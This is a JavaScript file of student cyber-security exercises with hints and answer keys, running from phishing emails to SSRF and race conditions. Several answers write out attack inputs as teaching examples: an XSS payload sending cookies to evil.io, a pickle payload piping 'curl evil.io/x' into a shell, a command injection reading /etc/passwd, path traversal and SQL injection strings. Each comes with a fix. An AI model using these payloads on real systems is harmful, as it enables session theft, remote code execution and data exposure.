// Cyber security problems, ordered from easiest to hardest. No maths: each one
// is a real situation a programmer or student meets, from spotting a phishing
// email to finding the bug in a login form.
// See src/data/problems.js for how problems are scheduled and what each field means.
// `example` holds plain code (escaped when shown); prompt, hint and answer are HTML.

export default [
  {
    slug: 'spot-the-phish',
    title: 'Spot the phish',
    difficulty: 'Easy',
    prompt: `<p>This email lands in your university inbox. List every warning sign you can find. Is it safe to click?</p>`,
    example: `From: TMU IT Services <it-helpdesk@tmu-support-desk.com>
Subject: URGENT: your account will be deleted in 24 hours

Dear student,
We detected unusual activity. Verify your password now or lose
access to your email, D2L and grades:
https://tmu.ca.account-verify.help/login

IT Support Team`,
    hint: `<p>Look at three things: who really sent it (the part after the <code>@</code>), where the link really goes (read the domain right to left), and how the message makes you feel.</p>`,
    answer: `<p><strong>Do not click.</strong> Warning signs:</p><ul><li><strong>Sender domain</strong> is <code>tmu-support-desk.com</code>, not the university's own domain. Anyone can register a lookalike.</li><li><strong>The link's real domain</strong> is <code>account-verify.help</code>. Everything to its left (<code>tmu.ca.</code>) is just a subdomain the attacker chose.</li><li><strong>Urgency and fear</strong>: "24 hours", "lose access to your grades". Pressure is there to stop you thinking.</li><li><strong>Asks for your password.</strong> Real IT teams never ask you to "verify" a password by email.</li><li><strong>Generic greeting</strong>: "Dear student".</li></ul><p>What to do: report it with your mail app's phishing button, and if you already clicked and typed your password, change it at once and turn on two-factor authentication.</p>`,
  },
  {
    slug: 'read-the-url',
    title: 'Which link is really your bank?',
    difficulty: 'Easy',
    prompt: `<p>Your bank is <code>mybank.com</code>. Which of these links actually go to it?</p>`,
    example: `1. https://login.mybank.com/account
2. https://mybank.com.secure-login.net/account
3. https://mybank-com.net/account
4. https://www.mybank.com@evil.io/account
5. https://mybank.com/account?next=evil.io`,
    hint: `<p>Find the part between <code>://</code> and the next <code>/</code>. Anything before an <code>@</code> in that part is a username, not the site. Then read the domain from the right.</p>`,
    answer: `<p><strong>Only 1 and 5.</strong></p><ol><li><code>login.mybank.com</code>: a subdomain of <code>mybank.com</code>. Safe.</li><li>The real domain is <code>secure-login.net</code>. <code>mybank.com</code> is just a subdomain label the attacker made up.</li><li><code>mybank-com.net</code> is a different domain that only looks similar.</li><li>Everything before the <code>@</code> is treated as a username. The browser actually goes to <code>evil.io</code>.</li><li>Goes to <code>mybank.com</code>. The <code>?next=evil.io</code> part is a query string, which only matters if the bank's site has an open-redirect bug.</li></ol><p>Rule: the real site is the last two labels before the first single <code>/</code> (like <code>mybank.com</code>), after skipping anything before an <code>@</code>. For country domains such as <code>.co.uk</code> it is the last three.</p>`,
  },
  {
    slug: 'rank-the-passwords',
    title: 'Rank the passwords',
    difficulty: 'Easy',
    prompt: `<p>Rank these from weakest to strongest against an attacker who has a stolen password database and a fast computer:</p>`,
    example: `A. P@ssw0rd!
B. Keerit2007
C. correct-horse-battery-staple-violin
D. x7#Qp!
E. a random 16-character string from a password manager`,
    hint: `<p>Attackers do not guess letter by letter. They try leaked passwords, dictionary words with common swaps (<code>a</code> to <code>@</code>), names with years, and every short combination.</p>`,
    answer: `<p><strong>Weakest to strongest: A, B, D, C, E.</strong></p><ul><li><strong>A</strong> is in every leaked-password list. The symbol swaps are the first thing cracking tools try.</li><li><strong>B</strong> is a name plus a year, a standard cracking pattern, and both parts are often public on social media.</li><li><strong>D</strong> is random but only 6 characters, so every combination can be tried quickly.</li><li><strong>C</strong> is four or more random words: long, easy to remember, and hard to guess if the words were picked at random.</li><li><strong>E</strong> is long and truly random, and a manager means you never reuse it.</li></ul><p>Length beats cleverness, and <strong>reuse</strong> is the real killer: one leaked site unlocks every account with the same password.</p>`,
  },
  {
    slug: 'what-the-padlock-means',
    title: 'What the padlock means',
    difficulty: 'Easy',
    prompt: `<p>A site shows the padlock icon and its address starts with <code>https://</code>. True or false?</p><ol><li>The site is safe to give your password to.</li><li>Nobody on the café Wi-Fi can read what you send to it.</li><li>The site really is the domain shown in the address bar.</li><li>The company behind it has been checked and is trustworthy.</li></ol>`,
    hint: `<p>HTTPS is about the <em>connection</em> between you and a domain. It says nothing about who owns the domain or what they will do with your data.</p>`,
    answer: `<ol><li><strong>False.</strong> Phishing sites get free certificates too. Most phishing pages today use HTTPS.</li><li><strong>True</strong>, for the contents: the traffic is encrypted. Others on the network can still see which domain you are connecting to.</li><li><strong>True.</strong> The certificate proves the server controls that domain. It is the domain you must check yourself.</li><li><strong>False.</strong> Certificates are issued automatically to anyone who controls a domain.</li></ol><p>So the padlock means "private connection to this exact domain", nothing more. Always read the domain.</p>`,
  },
  {
    slug: 'match-the-status-codes',
    title: 'Match the status codes',
    difficulty: 'Easy',
    prompt: `<p>Match each HTTP status code to what happened.</p>`,
    example: `Codes:  200   301   401   403   404   429   500

a) You are logged in, but this page is for admins only.
b) The page moved to a new address for good.
c) You sent too many requests too fast.
d) Everything worked.
e) The server's own code crashed.
f) There is nothing at this address.
g) You need to log in first.`,
    hint: `<p>2xx means success, 3xx means go elsewhere, 4xx means the request was the problem, 5xx means the server was the problem.</p>`,
    answer: `<ul><li><strong>200</strong>: d, it worked.</li><li><strong>301</strong>: b, moved permanently.</li><li><strong>401</strong>: g, not authenticated (the name says "Unauthorized", but it means "we don't know who you are").</li><li><strong>403</strong>: a, authenticated but not allowed.</li><li><strong>404</strong>: f, not found.</li><li><strong>429</strong>: c, too many requests, the code rate limiters use.</li><li><strong>500</strong>: e, internal server error.</li></ul><p>Security note: 401 against 403 is the difference between authentication (who are you?) and authorisation (what may you do?), two ideas that many breaches mix up.</p>`,
  },
  {
    slug: 'what-happens-when-you-type-a-url',
    title: 'What happens when you type a URL',
    difficulty: 'Easy',
    prompt: `<p>You type <code>example.com</code> and press Enter. Put these steps in order:</p>`,
    example: `A. The browser draws the page and fetches its images, CSS and scripts.
B. The browser and server do a TLS handshake and check the certificate.
C. A DNS lookup turns example.com into an IP address.
D. The browser sends an HTTP GET request for /.
E. A TCP connection is opened to that IP address on port 443.
F. The server sends back a response with HTML.`,
    hint: `<p>You cannot connect to a name, only to an address. And you cannot send anything private until the connection is encrypted.</p>`,
    answer: `<p><strong>C, E, B, D, F, A.</strong></p><ol><li><strong>C</strong>: DNS finds the IP address (checking caches first).</li><li><strong>E</strong>: TCP connects to port 443, the HTTPS port.</li><li><strong>B</strong>: TLS agrees on keys and proves the server owns the domain.</li><li><strong>D</strong>: the encrypted HTTP request is sent.</li><li><strong>F</strong>: the server answers.</li><li><strong>A</strong>: the browser renders, and repeats much of this for each extra file.</li></ol><p>Each step is also an attack point: DNS can be spoofed, certificates checked wrongly, and pages can load scripts from places you did not expect.</p>`,
  },
  {
    slug: 'committed-an-api-key',
    title: 'Oops, I pushed my API key',
    difficulty: 'Easy',
    prompt: `<p>You just pushed a commit to a public GitHub repo, then notice it contains <code>OPENAI_API_KEY=sk-...</code> in a config file. A friend says "just delete the file and push again". What should you actually do, and in what order?</p>`,
    hint: `<p>Bots scan public GitHub for keys within minutes. And Git remembers every old version of every file.</p>`,
    answer: `<ol><li><strong>Revoke (rotate) the key first</strong>, in the provider's dashboard, right now. Assume it is already stolen: automated scanners find public keys within minutes.</li><li><strong>Create a new key</strong> and store it outside the code: an <code>.env</code> file listed in <code>.gitignore</code>, or your host's environment variables.</li><li><strong>Check usage and billing</strong> for anything you did not do.</li><li><em>Then</em>, optionally, remove it from history with a tool like <code>git filter-repo</code>. Deleting the file in a new commit does nothing: the key is still in the old commit for anyone to read.</li></ol><p>Prevention: add <code>.env</code> to <code>.gitignore</code> before your first commit, and turn on GitHub secret scanning and push protection.</p>`,
  },
  {
    slug: 'pick-the-best-2fa',
    title: 'Pick the best two-factor',
    difficulty: 'Easy',
    prompt: `<p>Rank these second factors from weakest to strongest, and say what attack beats each one:</p><ol><li>A code sent by SMS</li><li>A code from an authenticator app</li><li>A hardware security key or passkey</li><li>Security questions ("first pet's name")</li></ol>`,
    hint: `<p>Ask: can it be guessed? Can it be redirected to someone else? Can a fake website trick you into handing it over?</p>`,
    answer: `<p><strong>Weakest to strongest: 4, 1, 2, 3.</strong></p><ul><li><strong>Security questions</strong> are not a real second factor: the answers are often on your Instagram.</li><li><strong>SMS</strong> can be stolen by SIM swapping (an attacker convinces your carrier to move your number) and phished.</li><li><strong>Authenticator apps</strong> beat SIM swaps, but you can still be tricked into typing the code on a fake site.</li><li><strong>Hardware keys and passkeys</strong> are tied to the real domain, so a lookalike site gets nothing. They resist phishing.</li></ul><p>Any second factor is far better than none. Turn on the strongest one each account offers, starting with email, since email resets everything else.</p>`,
  },
  {
    slug: 'hash-encrypt-encode',
    title: 'Hash, encrypt or encode?',
    difficulty: 'Easy',
    prompt: `<p>For each job, choose hashing, encryption or encoding:</p><ol><li>Store users' passwords.</li><li>Put binary image data inside a JSON string.</li><li>Store students' addresses so only the app can read them later.</li><li>Check that a downloaded file was not corrupted or changed.</li></ol>`,
    hint: `<p>Encoding is reversible by anyone. Encryption is reversible with a key. Hashing is not reversible at all.</p>`,
    answer: `<ol><li><strong>Hashing</strong>, with a slow password hash such as bcrypt, scrypt or Argon2, plus a salt. You never need the password back, only to check a guess.</li><li><strong>Encoding</strong>, such as Base64. It is not security: anyone can decode it.</li><li><strong>Encryption</strong>, because you need the original back, with the key kept separate from the data.</li><li><strong>Hashing</strong>, with SHA-256: compare the file's hash to the published one.</li></ol><p>The classic mistake is treating Base64 as encryption. If you can decode it without a key, so can an attacker.</p>`,
  },
  {
    slug: 'public-wifi-risks',
    title: 'Café Wi-Fi',
    difficulty: 'Easy',
    prompt: `<p>You join a free café network called <code>Cafe_Free_WiFi</code>. What can someone else on that network, or whoever runs it, realistically see or do? What protects you?</p>`,
    hint: `<p>Think about what HTTPS hides and what it does not, and about who created the network name.</p>`,
    answer: `<ul><li><strong>Fake networks</strong>: anyone can name a hotspot <code>Cafe_Free_WiFi</code>. If you join the attacker's, all your traffic goes through their device.</li><li><strong>With HTTPS</strong> (almost every site today), they can see <em>which domains</em> you visit, but not the pages, passwords or messages.</li><li><strong>Without HTTPS</strong>, everything is readable and changeable.</li><li><strong>Captive "login" pages</strong> can be phishing pages asking for real account details.</li><li><strong>Shared folders and open ports</strong> on your laptop are visible to the network.</li></ul><p>Protection: ignore certificate warnings at your peril (do not click through), keep the firewall on, set the network as "public", and use your phone's hotspot or a trusted VPN for anything sensitive.</p>`,
  },
  {
    slug: 'spot-the-sql-injection',
    title: 'Spot the SQL injection',
    difficulty: 'Medium',
    prompt: `<p>This login check works for normal users. What can an attacker type in the username box to log in as anyone, and how do you fix it?</p>`,
    example: `def login(db, username, password_hash):
    query = f"SELECT * FROM users WHERE name = '{username}' AND pw = '{password_hash}'"
    return db.execute(query).fetchone() is not None`,
    hint: `<p>The username is pasted straight into the SQL text. What if it contains a quote, and then SQL that comments out the rest?</p>`,
    answer: `<p>Typing <code>admin' --</code> makes the query:</p><pre><code>SELECT * FROM users WHERE name = 'admin' --' AND pw = '...'</code></pre><p><code>--</code> starts a comment, so the password check disappears and the attacker is logged in as admin. <code>' OR '1'='1' --</code> logs in as the first user.</p><p><strong>Fix:</strong> never build SQL with string formatting. Use parameters, so the database treats input as data, never as code:</p><pre><code>query = "SELECT * FROM users WHERE name = ? AND pw = ?"
db.execute(query, (username, password_hash))</code></pre><p>Escaping by hand is not a fix; parameters are.</p>`,
  },
  {
    slug: 'spot-the-xss',
    title: 'Spot the XSS',
    difficulty: 'Medium',
    prompt: `<p>A course forum shows each comment like this. A student posts a comment, and everyone who opens the page gets logged out and their session stolen. What did they post, and what is the fix?</p>`,
    example: `// JavaScript in the page
for (const c of comments) {
  list.innerHTML += "<li><b>" + c.author + "</b>: " + c.text + "</li>";
}`,
    hint: `<p><code>innerHTML</code> turns a string into real HTML, including any tags inside the comment text.</p>`,
    answer: `<p>They posted HTML containing script, for example:</p><pre><code>&lt;img src=x onerror="fetch('https://evil.io/?c=' + document.cookie)"&gt;</code></pre><p>The broken image fires <code>onerror</code>, and the attacker's code runs in every reader's browser as if the forum wrote it. That is <strong>cross-site scripting (XSS)</strong>.</p><p><strong>Fixes</strong>, use all three:</p><ul><li>Insert user text as text, not HTML: <code>element.textContent = c.text</code>, or escape <code>&lt; &gt; &amp; " '</code> before building HTML.</li><li>Mark session cookies <code>HttpOnly</code> so scripts cannot read them.</li><li>Add a Content-Security-Policy that blocks inline scripts.</li></ul>`,
  },
  {
    slug: 'path-traversal',
    title: 'Download any file',
    difficulty: 'Medium',
    prompt: `<p>This endpoint lets students download their uploaded assignments. How can someone download the server's secret config instead?</p>`,
    example: `@app.get("/download")
def download(name: str):
    return open(f"uploads/{name}", "rb").read()

# Normal use: /download?name=essay.pdf`,
    hint: `<p>What does <code>..</code> mean in a file path?</p>`,
    answer: `<p>Request <code>/download?name=../.env</code> or <code>../../etc/passwd</code>. Each <code>../</code> climbs one folder out of <code>uploads/</code>. This is <strong>path traversal</strong>.</p><p><strong>Fix:</strong> never use a user-supplied name as a path. Better, look files up by an ID in a database. If you must use names, resolve the full path and check it is still inside the folder:</p><pre><code>from pathlib import Path
BASE = Path("uploads").resolve()

def safe_path(name):
    p = (BASE / name).resolve()
    if not p.is_relative_to(BASE):
        raise PermissionError("nope")
    return p</code></pre><p>And check the file belongs to the logged-in student, or you have the next problem too.</p>`,
  },
  {
    slug: 'change-the-number',
    title: 'Change the number in the URL',
    difficulty: 'Medium',
    prompt: `<p>After logging in, you view your receipt at <code>https://shop.example/receipts/1043</code>. You change it to <code>/receipts/1042</code> and see a stranger's name, address and order. What is the bug called, and where exactly must the fix go?</p>`,
    hint: `<p>The server checked that you are logged in. What did it forget to check?</p>`,
    answer: `<p>This is an <strong>IDOR</strong> (insecure direct object reference), a form of broken access control, the top item on the OWASP Top 10.</p><p>The server checked <em>authentication</em> (you are logged in) but not <em>authorisation</em> (this receipt is yours). The fix goes <strong>on the server, on every request</strong>:</p><pre><code>receipt = db.get_receipt(receipt_id)
if receipt is None or receipt.owner_id != current_user.id:
    abort(404)</code></pre><p>Hiding the link, using random-looking IDs, or checking in the browser's JavaScript are not fixes. Random IDs make guessing harder, but the ownership check is what makes it safe. Returning 404 rather than 403 also avoids confirming that receipt 1042 exists.</p>`,
  },
  {
    slug: 'ping-command-injection',
    title: 'The ping tool',
    difficulty: 'Medium',
    prompt: `<p>A network dashboard lets admins ping a host. What happens if someone enters <code>8.8.8.8; cat /etc/passwd</code>? Fix it.</p>`,
    example: `import os

def ping(host):
    os.system(f"ping -c 1 {host}")`,
    hint: `<p><code>os.system</code> hands the whole string to a shell. In a shell, <code>;</code> means "and then run this next command".</p>`,
    answer: `<p>The shell runs <code>ping -c 1 8.8.8.8</code> and then <code>cat /etc/passwd</code>. Any command can follow the <code>;</code> (or <code>&amp;&amp;</code>, <code>|</code>, backticks), so this is <strong>command injection</strong>, which usually means full control of the server.</p><p><strong>Fix:</strong> do not go through a shell, pass arguments as a list, and validate the input:</p><pre><code>import ipaddress, subprocess

def ping(host):
    ip = ipaddress.ip_address(host)   # raises ValueError if not an IP
    subprocess.run(["ping", "-c", "1", str(ip)], check=False, timeout=5)</code></pre><p>With a list and no <code>shell=True</code>, <code>;</code> is just a character in an argument, not a command separator.</p>`,
  },
  {
    slug: 'cookie-flags',
    title: 'The three cookie flags',
    difficulty: 'Medium',
    prompt: `<p>A login sets this cookie. Name the three missing flags and the attack each one blocks.</p>`,
    example: `Set-Cookie: session=8f2c1e9a7b; Path=/`,
    hint: `<p>One stops JavaScript, one stops plain HTTP, and one stops other websites.</p>`,
    answer: `<pre><code>Set-Cookie: session=8f2c1e9a7b; Path=/; HttpOnly; Secure; SameSite=Lax</code></pre><ul><li><strong>HttpOnly</strong>: JavaScript cannot read it, so an XSS bug cannot simply steal the session.</li><li><strong>Secure</strong>: only sent over HTTPS, so it never crosses a network in plain text.</li><li><strong>SameSite=Lax</strong> (or <code>Strict</code>): not sent on most requests started by other sites, which blocks most cross-site request forgery (CSRF).</li></ul><p>Add an expiry (<code>Max-Age</code>) too, and make the server able to revoke sessions on logout.</p>`,
  },
  {
    slug: 'chmod-777',
    title: 'Just chmod 777 it',
    difficulty: 'Medium',
    prompt: `<p>Your script will not run on the university server, so a forum post says "just run <code>chmod 777 -R ~/project</code>". What does that do, why is it dangerous, and what should you run instead?</p>`,
    example: `$ ls -l run.sh
-rw-r--r-- 1 keerit students 210 Oct 28 run.sh`,
    hint: `<p>The three digits are owner, group and everyone else. 7 means read, write and execute. Who else is on a shared server?</p>`,
    answer: `<p><code>777</code> gives <strong>everyone</strong> on the machine read, write and execute on every file in the project, and <code>-R</code> applies it to every file inside. On a shared university server, any other user could read your assignment, or edit your script so it runs their code the next time you run it.</p><p>The script only lacks execute permission for you. Add just that:</p><pre><code>chmod u+x run.sh      # -rwxr--r--</code></pre><p>Rule of least privilege: give the smallest permission that works. For private work, <code>chmod 700</code> on the folder keeps everyone else out.</p>`,
  },
  {
    slug: 'reset-or-revert',
    title: 'Reset or revert?',
    difficulty: 'Medium',
    prompt: `<p>Your group's shared <code>main</code> branch has a bad commit that broke everything. It is already pushed and two teammates have pulled it. Should you use <code>git reset --hard HEAD~1</code> and force-push, or <code>git revert</code>? Why?</p>`,
    hint: `<p>One rewrites history that other people already have. The other adds a new commit.</p>`,
    answer: `<p><strong>Use <code>git revert &lt;commit&gt;</code></strong>, then push normally.</p><ul><li><code>revert</code> adds a new commit that undoes the bad one. History stays the same, so teammates just pull. Nothing is lost, and the log shows what happened.</li><li><code>reset --hard</code> plus <code>push --force</code> rewrites shared history. Teammates' copies no longer match, their next push can bring the bad commit back or fail confusingly, and any work built on top can be lost.</li></ul><p>Rule: <code>reset</code> and <code>rebase</code> are fine for commits only you have. Once pushed to a shared branch, <code>revert</code>. If you ever must force-push, use <code>--force-with-lease</code> so you do not overwrite someone else's new work.</p>`,
  },
  {
    slug: 'cors-is-not-security',
    title: 'CORS will protect us',
    difficulty: 'Medium',
    prompt: `<p>A teammate says: "Our API is safe from attackers because CORS only allows requests from our own website." What is wrong with this?</p>`,
    hint: `<p>Who enforces CORS: the server, or the browser? What if the attacker does not use a browser?</p>`,
    answer: `<p>CORS is enforced by <strong>browsers</strong>, to stop <em>other websites' JavaScript</em> from reading your API's responses using a visitor's logged-in session. It does nothing against:</p><ul><li><code>curl</code>, Python scripts, Postman or any other tool, which simply ignore CORS;</li><li>an attacker calling your API with their own account.</li></ul><p>Every API endpoint must still check <strong>authentication and authorisation on the server</strong> for every request. Think of CORS as protecting your users from other sites, not protecting your server from attackers.</p>`,
  },
  {
    slug: 'brute-force-login',
    title: 'A million guesses',
    difficulty: 'Medium',
    prompt: `<p>Your login page tells users "wrong password" or "no such user", has no limits, and the logs show 50,000 attempts an hour from many IP addresses against many accounts. Name the attack and four defences.</p>`,
    hint: `<p>Many accounts, one or two common passwords each, from many addresses: this is not one person guessing one password.</p>`,
    answer: `<p>This is <strong>credential stuffing</strong> (leaked email and password pairs from other sites) or <strong>password spraying</strong> (a few common passwords tried across many accounts).</p><ol><li><strong>Same error for both cases</strong>: "Incorrect email or password", so attackers cannot list valid accounts.</li><li><strong>Rate limiting</strong> per account and per IP, with growing delays; answer with 429.</li><li><strong>Two-factor authentication</strong>, so a correct password alone is not enough.</li><li><strong>Block known-breached passwords</strong> at sign-up (for example via the Have I Been Pwned range API).</li></ol><p>Also: alert on unusual spikes, and use a CAPTCHA only after suspicious failures so normal users are not punished.</p>`,
  },
  {
    slug: 'jwt-trust-issues',
    title: 'JWT trust issues',
    difficulty: 'Hard',
    prompt: `<p>An app stores the logged-in user in a JWT and reads it like this. How does an attacker become admin without knowing any secret?</p>`,
    example: `import base64, json

def current_user(token):
    header, payload, signature = token.split(".")
    data = json.loads(base64.urlsafe_b64decode(payload + "=="))
    return data   # e.g. {"user": "keerit", "role": "student"}`,
    hint: `<p>A JWT is three Base64 parts. Which part proves the token was not edited, and does this code look at it?</p>`,
    answer: `<p>The code <strong>decodes but never verifies</strong> the signature. An attacker takes their own token, Base64-decodes the payload, changes <code>"role": "student"</code> to <code>"role": "admin"</code>, encodes it again and sends it. The server believes it.</p><p><strong>Fix:</strong> use a maintained library and verify with a fixed algorithm and key:</p><pre><code>import jwt   # PyJWT
data = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])</code></pre><p>Always pin <code>algorithms</code>: older libraries accepted <code>"alg": "none"</code> (no signature at all) or let an attacker switch algorithms. Also check expiry (<code>exp</code>), and remember a JWT's payload is readable by anyone: never put secrets in it.</p>`,
  },
  {
    slug: 'timing-attack-compare',
    title: 'The leaky comparison',
    difficulty: 'Hard',
    prompt: `<p>This API checks a secret key. It looks correct. How can an attacker recover the key one character at a time without seeing any error message?</p>`,
    example: `def check_key(given):
    return given == API_KEY`,
    hint: `<p><code>==</code> on strings stops at the first character that differs. What does that do to how long the comparison takes?</p>`,
    answer: `<p>A wrong first character fails instantly; a correct first character takes a tiny bit longer because the comparison moves on to the second. By sending many guesses and <strong>measuring response times</strong>, an attacker can learn each character in turn. This is a <strong>timing attack</strong>, a side channel.</p><p><strong>Fix:</strong> use a constant-time comparison:</p><pre><code>import hmac
def check_key(given):
    return hmac.compare_digest(given.encode(), API_KEY.encode())</code></pre><p>Over the internet the difference is small and noisy, but attacks have worked in practice with enough samples. Pair it with rate limiting. For passwords, compare hashes with the hashing library's own verify function, which already does this.</p>`,
  },
  {
    slug: 'never-unpickle-strangers',
    title: 'Never unpickle strangers',
    difficulty: 'Hard',
    prompt: `<p>A study app lets users export and import their flashcard decks. Why is this import function a remote code execution bug?</p>`,
    example: `import pickle

def import_deck(uploaded_bytes):
    return pickle.loads(uploaded_bytes)`,
    hint: `<p>Pickle does not just store data. It stores instructions for rebuilding objects, and those instructions can call any function.</p>`,
    answer: `<p>A pickle can tell Python to call any function while loading, through an object's <code>__reduce__</code> method. An attacker uploads a "deck" built like this:</p><pre><code>class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("curl evil.io/x | sh",))</code></pre><p>The moment the server runs <code>pickle.loads</code>, it runs the attacker's command. This is <strong>insecure deserialisation</strong>.</p><p><strong>Fix:</strong> use a data-only format such as JSON for anything a user can supply, and validate the structure after loading. Python's own documentation warns: never unpickle data you do not trust. The same goes for <code>yaml.load</code> without <code>SafeLoader</code>.</p>`,
  },
  {
    slug: 'ssrf-link-preview',
    title: 'The link preview',
    difficulty: 'Hard',
    prompt: `<p>A chat app on a cloud server shows a preview for any link a user posts by fetching the page on the server. A user posts <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>. What just happened?</p>`,
    example: `import requests

def preview(url):
    html = requests.get(url, timeout=5).text
    return extract_title_and_image(html)`,
    hint: `<p>That address is not on the internet. It is only reachable from inside the cloud server itself. Who is making the request?</p>`,
    answer: `<p>This is <strong>server-side request forgery (SSRF)</strong>. The server fetches whatever URL it is given, including internal addresses an outsider cannot reach. <code>169.254.169.254</code> is the cloud metadata service: on many setups it hands out the server's temporary cloud credentials. The preview then shows them to the attacker. The 2019 Capital One breach used this route.</p><p><strong>Fixes:</strong></p><ul><li>Resolve the hostname and refuse private, loopback and link-local addresses (<code>10.0.0.0/8</code>, <code>127.0.0.0/8</code>, <code>169.254.0.0/16</code>, <code>192.168.0.0/16</code> and so on), and check again after every redirect.</li><li>Allow only <code>http</code> and <code>https</code>.</li><li>Turn on the cloud provider's protected metadata mode (for example AWS IMDSv2).</li><li>Run the fetcher in an isolated network with no access to internal services.</li></ul>`,
  },
  {
    slug: 'coupon-race-condition',
    title: 'The coupon used 40 times',
    difficulty: 'Hard',
    prompt: `<p>A one-time $20 coupon was applied 40 times in one second. The code checks before it applies. How?</p>`,
    example: `def redeem(user, code):
    coupon = db.get_coupon(code)
    if coupon.used:
        return "Already used"
    give_credit(user, 20)
    coupon.used = True
    db.save(coupon)`,
    hint: `<p>What if 40 requests all run the <code>if coupon.used</code> line before any of them reaches <code>coupon.used = True</code>?</p>`,
    answer: `<p>A <strong>race condition</strong> (time-of-check to time-of-use). The attacker fires 40 requests at once. All 40 read <code>used = False</code>, all pass the check, and all give credit before any of them saves.</p><p><strong>Fix:</strong> make the check and the update one atomic step in the database:</p><pre><code>rows = db.execute(
    "UPDATE coupons SET used = 1 WHERE code = ? AND used = 0", (code,)
).rowcount
if rows == 0:
    return "Already used"
give_credit(user, 20)</code></pre><p>Only one request can change the row from 0 to 1. Other options: a transaction with a row lock (<code>SELECT ... FOR UPDATE</code>), or a unique constraint on a redemptions table. Money, stock levels and vote counts all need this.</p>`,
  },
  {
    slug: 'which-header-stops-it',
    title: 'Which header stops it?',
    difficulty: 'Hard',
    prompt: `<p>Match each attack to the HTTP response header that defends against it:</p>`,
    example: `Attacks:
1. An injected <script> tag runs on your page.
2. Another site loads your bank page in an invisible frame and tricks
   users into clicking buttons on it (clickjacking).
3. The first visit to your site over plain http:// is intercepted.
4. A browser treats an uploaded .txt file as HTML and runs it.

Headers:
A. Strict-Transport-Security
B. X-Content-Type-Options: nosniff
C. Content-Security-Policy
D. Content-Security-Policy: frame-ancestors 'none'  (or X-Frame-Options: DENY)`,
    hint: `<p>Each header's name gives a clue: transport, content type, frames.</p>`,
    answer: `<ul><li><strong>1, C.</strong> A Content-Security-Policy such as <code>script-src 'self'</code> blocks inline and outside scripts, so injected script does not run.</li><li><strong>2, D.</strong> <code>frame-ancestors 'none'</code> (or the older <code>X-Frame-Options: DENY</code>) forbids other sites from framing your pages.</li><li><strong>3, A.</strong> HSTS tells the browser to use HTTPS only for this domain for a set time, so later visits never try plain HTTP.</li><li><strong>4, B.</strong> <code>nosniff</code> stops the browser guessing a file's type from its contents.</li></ul><p>These are defence in depth: they limit the damage when a bug slips through, but they do not replace fixing the bug. mycsmajor itself sends all four.</p>`,
  },
  {
    slug: 'typosquatted-package',
    title: 'One letter off',
    difficulty: 'Hard',
    prompt: `<p>A classmate's laptop starts sending their browser passwords to a strange server. Their project's <code>requirements.txt</code> looks like this. What probably happened, and how do you stop it happening to you?</p>`,
    example: `flask==3.0.3
reqeusts==2.31.0
python-dotenv==1.0.1`,
    hint: `<p>Read the second line slowly.</p>`,
    answer: `<p><code>reqeusts</code> is not <code>requests</code>. It is a <strong>typosquatted package</strong>: attackers publish malicious packages with names one typo away from popular ones. <code>pip install</code> runs the package's install code, which can steal files, passwords and tokens. This has happened many times on PyPI and npm.</p><p><strong>Defences:</strong></p><ul><li>Copy package names from official docs; check the project page, download counts and maintainer before installing.</li><li>Pin versions and use lock files with hashes (<code>pip install --require-hashes</code>, <code>package-lock.json</code>).</li><li>Run <code>pip-audit</code> or <code>npm audit</code>, and turn on Dependabot alerts.</li><li>Use a virtual environment so a project's packages do not spread across your machine.</li></ul><p>If it happened: remove the package, then change every password and token stored on that machine, from a different device.</p>`,
  },
  {
    slug: 'what-not-to-log',
    title: 'What not to log',
    difficulty: 'Hard',
    prompt: `<p>Find the three security problems in this logging line, and one more that lets a user forge log entries.</p>`,
    example: `log.info(f"login user={username} password={password} "
         f"token={session_token} card={card_number} ip={ip}")`,
    hint: `<p>Logs get copied to many places and read by many people. And what if <code>username</code> contains a newline?</p>`,
    answer: `<ol><li><strong>The password</strong>, in plain text. Logs are rarely protected like a password database. Never log it, not even on failure.</li><li><strong>The session token</strong>: anyone who reads the logs can take over the session.</li><li><strong>The card number</strong>: logging full card numbers breaks the card industry's PCI DSS rules. At most, log the last four digits.</li><li><strong>Log injection:</strong> a username like <code>bob\\nlogin user=admin status=ok</code> writes a fake second line. Escape or strip newlines, or use structured (JSON) logging that encodes fields properly.</li></ol><p>Do log: who, what action, when, from which IP, and whether it succeeded. That is what you need after an incident, without creating a second breach.</p>`,
  },
  {
    slug: 'password-reset-holes',
    title: 'The password reset flow',
    difficulty: 'Hard',
    prompt: `<p>Here is a password reset design. Find at least four ways to break it.</p>`,
    example: `1. User enters their email.
2. Server builds a token: token = md5(email + current_date)
3. Server emails: https://app.example/reset?email=...&token=...
4. The link works forever and can be used many times.
5. The page says "No account with that email" if the email is unknown.
6. The reset link is built from the request's Host header.`,
    hint: `<p>Could an attacker compute the token themselves? How long is it useful? What does step 6 do if the attacker sends a request with their own Host header?</p>`,
    answer: `<ol><li><strong>Predictable token.</strong> Anyone who knows the email and the date can compute <code>md5(email + date)</code> and reset the password. Use a long random token: <code>secrets.token_urlsafe(32)</code>, and store only its hash.</li><li><strong>Never expires and reusable.</strong> A link found in an old email or a browser history works forever. Expire it in about 30 minutes, allow one use, and cancel it when the password changes.</li><li><strong>Account enumeration.</strong> Step 5 tells attackers which emails have accounts. Always say "If that email has an account, we sent a link."</li><li><strong>Host header injection.</strong> An attacker requests a reset for the victim with <code>Host: evil.io</code>; the victim gets a real email whose link points to the attacker's site, which receives the token. Build links from a fixed, configured domain.</li></ol><p>Also: rate-limit reset requests, and after a reset, log out all other sessions and email the user that the password changed.</p>`,
  },
  {
    slug: 'read-the-logs',
    title: 'Read the logs',
    difficulty: 'Hard',
    prompt: `<p>You are on call. Here is a slice of a web server's access log. What happened, in what order, and what do you do first?</p>`,
    example: `03:12:01 203.0.113.9 POST /login 401
03:12:01 203.0.113.9 POST /login 401
   ... 4,800 more 401s from 203.0.113.9 in 6 minutes ...
03:18:22 203.0.113.9 POST /login 200  user=t.nguyen
03:18:40 203.0.113.9 GET  /api/users?page=1 200
03:18:41 203.0.113.9 GET  /api/users?page=2 200
   ... pages 3 to 412 ...
03:21:09 203.0.113.9 GET  /api/users?page=412 200
03:21:30 203.0.113.9 POST /api/users/t.nguyen/email 200`,
    hint: `<p>Split it into phases: getting in, taking things, staying in.</p>`,
